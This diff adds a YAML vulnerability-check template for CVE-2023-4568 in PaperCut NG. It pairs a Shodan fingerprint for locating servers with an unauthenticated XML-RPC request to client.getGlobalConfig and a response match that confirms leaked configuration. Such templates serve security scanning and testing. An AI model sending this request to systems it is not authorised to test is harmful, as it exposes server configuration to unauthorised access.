@@ -1,0 +1,28 @@
+id: poc-yaml-papercut-ng-unauthenticated-xmlrpc
+info:
+  name: PaperCut NG 未经身份验证的 XMLRPC(CVE-2023-4568)
+  severity: medium
+  tags:
+  - CVE-2023-4568
+  - XML注入
+  finger: PaperCut NG
+  shodan: html:"content="PaperCut""
+requests:
+- method: POST
+  path: /rpc/clients/xmlrpc
+  headers:
+    Content-Type: text/xml
+  data: '<?xml version="1.0"?><methodCall><methodName>client.getGlobalConfig</methodName><params><param><value><string>str1</string></value></param><param><value><string>str2</string></value></param></params></methodCall>
+
+    '
+  expression: 'status_code == 200
+
+    && contains(body,"<name>conf.auth-ttl-default</name>")
+
+    && contains(body,"Register as a New User")
+
+    && contains(body,"<int>")
+
+    '
+variables: {}
+transport: http
